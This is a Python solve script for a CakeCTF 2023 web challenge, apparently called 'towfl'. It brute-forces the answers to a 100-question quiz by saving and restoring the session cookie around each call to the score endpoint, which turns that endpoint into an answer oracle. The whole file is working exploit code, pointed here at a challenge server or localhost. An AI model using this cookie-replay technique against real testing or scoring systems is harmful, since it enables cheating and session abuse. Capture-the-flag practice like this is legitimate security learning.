import requests
import json

s = requests.Session()
base = "http://towfl.2023.cakectf.com:8888"
base = "http://localhost:8888"

answer = [[None]*10 for _ in range(10)]

s.post(base+"/api/start")
for i in range(100):
    print(i)
    for j in range(4):
        answer[i//10][i%10] = j
        s.post(base+"/api/submit", json=answer)
        c = s.cookies["session"]
        r = s.get(base+"/api/score")
        s.cookies["session"] = c
        if r.json()["data"]["score"]==i+1:
            break
    else:
        print("error")

s.post(base+"/api/submit", json=answer)
r = s.get(base+"/api/score")
print(r.json())
